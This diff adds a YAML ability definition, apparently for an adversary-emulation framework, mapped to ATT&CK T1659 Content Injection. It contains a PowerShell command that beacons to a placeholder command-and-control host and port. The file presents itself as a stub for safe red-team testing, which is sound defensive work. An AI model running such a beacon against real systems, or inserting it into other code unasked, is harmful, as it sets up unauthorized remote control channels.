@@ -1,0 +1,13 @@
+- id: 0dfcb979-7e43-46d3-8251-ca095952c2d0
+  name: Content Injection
+  description: Ability for Content Injection (ATT&CK T1659). Generated from Atomic
+    Red Team procedures; review and test safely before use. [AUTO-INFERRED SAFE STUB]
+  tactic: command-and-control
+  technique:
+    attack_id: T1659
+    name: Content Injection
+  platforms:
+    windows:
+      psh:
+        command: powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing
+          http://#{c2_host}:#{c2_port}/beacon?id=#{paw} -Method GET"
